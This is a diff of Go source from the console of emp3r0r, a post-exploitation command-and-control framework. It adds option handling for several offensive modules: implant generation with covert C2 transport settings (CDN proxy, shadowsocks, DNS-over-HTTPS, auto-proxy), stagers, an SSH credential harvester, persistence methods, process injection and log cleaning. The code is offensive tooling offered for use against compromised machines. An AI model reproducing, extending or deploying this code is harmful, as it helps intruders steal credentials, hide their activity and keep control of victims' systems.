@@ -1,10 +1,15 @@
+//go:build linux
+// +build linux
+
 package cc
 
 import (
+	"os"
 	"strconv"
 	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/lithammer/fuzzysearch/fuzzy"
 )
 
@@ -41,6 +46,7 @@ var (
 
 	// ModuleHelpers a map of module helpers
 	ModuleHelpers = map[string]func(){
+		emp3r0r_data.ModGenAgent:     modGenAgent,
 		emp3r0r_data.ModCMD_EXEC:     moduleCmd,
 		emp3r0r_data.ModSHELL:        moduleShell,
 		emp3r0r_data.ModPROXY:        moduleProxy,
@@ -51,8 +57,10 @@ var (
 		emp3r0r_data.ModPERSISTENCE:  modulePersistence,
 		emp3r0r_data.ModVACCINE:      moduleVaccine,
 		emp3r0r_data.ModINJECTOR:     moduleInjector,
-		emp3r0r_data.ModREVERSEPROXY: moduleReverseProxy,
+		emp3r0r_data.ModBring2CC:     moduleBring2CC,
 		emp3r0r_data.ModGDB:          moduleGDB,
+		emp3r0r_data.ModStager:       modStager,
+		emp3r0r_data.ModSSHHarvester: module_ssh_harvester,
 	}
 )
 
@@ -115,15 +123,15 @@ func UpdateOptions(modName string) (exist bool) {
 			"bash", "zsh", "sh", "python", "python3",
 			"cmd.exe", "powershell.exe",
 		}
-		shellOpt.Val = "bash"
+		shellOpt.Val = "elvsh"
 
 		argsOpt := addIfNotFound("args")
 		argsOpt.Val = ""
 		portOpt := addIfNotFound("port")
 		portOpt.Vals = []string{
-			RuntimeConfig.SSHDPort, "22222",
+			RuntimeConfig.SSHDShellPort, "22222",
 		}
-		portOpt.Val = RuntimeConfig.SSHDPort
+		portOpt.Val = RuntimeConfig.SSHDShellPort
 
 	case modName == emp3r0r_data.ModPORT_FWD:
 		// rport
@@ -136,6 +144,10 @@ func UpdateOptions(modName string) (exist bool) {
 		switchOpt := addIfNotFound("switch")
 		switchOpt.Vals = []string{"on", "off", "reverse"}
 		switchOpt.Val = "on"
+		// protocol
+		protOpt := addIfNotFound("protocol")
+		protOpt.Vals = []string{"tcp", "udp"}
+		protOpt.Val = "tcp"
 
 	case modName == emp3r0r_data.ModCLEAN_LOG:
 		// keyword to clean
@@ -152,7 +164,7 @@ func UpdateOptions(modName string) (exist bool) {
 
 	case modName == emp3r0r_data.ModLPE_SUGGEST:
 		currentOpt = addIfNotFound("lpe_helper")
-		for name := range LPEHelpers {
+		for name := range LPEHelperURLs {
 			currentOpt.Vals = append(currentOpt.Vals, name)
 		}
 		currentOpt.Val = "lpe_les"
@@ -162,24 +174,89 @@ func UpdateOptions(modName string) (exist bool) {
 		pidOpt.Vals = []string{"0"}
 		pidOpt.Val = "0"
 		methodOpt := addIfNotFound("method")
-		methodOpt.Vals = []string{"gdb_loader", "inject_shellcode", "inject_loader"}
-		methodOpt.Val = "inject_shellcode"
+		for k := range emp3r0r_data.InjectorMethods {
+			methodOpt.Vals = append(methodOpt.Vals, k)
+		}
+		methodOpt.Val = "shared_library"
 
-	case modName == emp3r0r_data.ModREVERSEPROXY:
+	case modName == emp3r0r_data.ModBring2CC:
 		addrOpt := addIfNotFound("addr")
 		addrOpt.Vals = []string{"127.0.0.1"}
 		addrOpt.Val = "<blank>"
 
 	case modName == emp3r0r_data.ModPERSISTENCE:
 		currentOpt = addIfNotFound("method")
-		methods := make([]string, len(emp3r0r_data.PersistMethods))
-		i := 0
 		for k := range emp3r0r_data.PersistMethods {
-			methods[i] = k
-			i++
+			currentOpt.Vals = append(currentOpt.Vals, k)
 		}
-		currentOpt.Vals = methods
-		currentOpt.Val = "all"
+		currentOpt.Val = "profiles"
+
+	case modName == emp3r0r_data.ModStager:
+		stager_type_opt := addIfNotFound("type")
+		stager_type_opt.Val = Stagers[0]
+		stager_type_opt.Vals = Stagers
+
+		agentpath_type_opt := addIfNotFound("agent_path")
+		agentpath_type_opt.Val = "/tmp/emp3r0r"
+		files, err := os.ReadDir(EmpWorkSpace)
+		if err != nil {
+			CliPrintWarning("Listing emp3r0r work directory: %v", err)
+		}
+		var listing []string
+		for _, f := range files {
+			if f.IsDir() {
+				continue
+			}
+			listing = append(listing, f.Name())
+		}
+		agentpath_type_opt.Vals = listing
+
+	case modName == emp3r0r_data.ModGenAgent:
+		// os
+		os := addIfNotFound("os")
+		os.Vals = []string{"linux", "windows", "dll"}
+		os.Val = "linux"
+		// arch
+		arch := addIfNotFound("arch")
+		arch.Vals = Arch_List
+		arch.Val = "amd64"
+		// cc host
+		existing_names := tun.NamesInCert(ServerCrtFile)
+		cc_host := addIfNotFound("cc_host")
+		cc_host.Vals = existing_names
+		cc_host.Val = read_cached_config("cc_host").(string)
+		// cc indicator
+		cc_indicator := addIfNotFound("cc_indicator")
+		cc_indicator.Val = read_cached_config("cc_indicator").(string)
+		// cc indicator value
+		cc_indicator_text := addIfNotFound("indicator_text")
+		cc_indicator_text.Val = read_cached_config("indicator_text").(string)
+		// NCSI switch
+		ncsi := addIfNotFound("ncsi")
+		ncsi.Vals = []string{"on", "off"}
+		ncsi.Val = "on"
+		// CDN proxy
+		cdn_proxy := addIfNotFound("cdn_proxy")
+		cdn_proxy.Val = read_cached_config("cdn_proxy").(string)
+		// shadowsocks switch
+		shadowsocks := addIfNotFound("shadowsocks")
+		shadowsocks.Vals = []string{"on", "off", "with_kcp"}
+		shadowsocks.Val = "off"
+		// agent proxy for c2 transport
+		c2transport_proxy := addIfNotFound("c2transport_proxy")
+		c2transport_proxy.Val = RuntimeConfig.C2TransportProxy
+		// agent proxy timeout
+		autoproxy_timeout := addIfNotFound("autoproxy_timeout")
+		timeout := read_cached_config("autoproxy_timeout").(float64)
+		autoproxy_timeout.Val = strconv.FormatFloat(timeout, 'f', -1, 64)
+		// DoH
+		doh := addIfNotFound("doh_server")
+		doh.Vals = []string{"https://1.1.1.1/dns-query", "https://dns.google/dns-query"}
+		doh.Val = read_cached_config("doh_server").(string)
+		// auto proxy, with UDP broadcasting
+		auto_proxy := addIfNotFound("auto_proxy")
+		auto_proxy.Vals = []string{"on", "off"}
+		auto_proxy.Val = "off"
 
 	default:
 		// custom modules
@@ -196,15 +273,23 @@ func UpdateOptions(modName string) (exist bool) {
 
 // ModuleRun run current module
 func ModuleRun() {
-	if CurrentTarget == nil {
-		if CurrentMod == emp3r0r_data.ModCMD_EXEC {
-			if !CliYesNo("Run on all targets") {
-				CliPrintError("Target not specified")
-				return
-			}
-			ModuleHelpers[emp3r0r_data.ModCMD_EXEC]()
+	if CurrentMod == emp3r0r_data.ModCMD_EXEC {
+		if !CliYesNo("Run on all targets") {
+			CliPrintError("Target not specified")
 			return
 		}
+		ModuleHelpers[emp3r0r_data.ModCMD_EXEC]()
+		return
+	}
+	if CurrentMod == emp3r0r_data.ModGenAgent {
+		ModuleHelpers[emp3r0r_data.ModGenAgent]()
+		return
+	}
+	if CurrentMod == emp3r0r_data.ModStager {
+		ModuleHelpers[emp3r0r_data.ModStager]()
+		return
+	}
+	if CurrentTarget == nil {
 		CliPrintError("Target not specified")
 		return
 	}
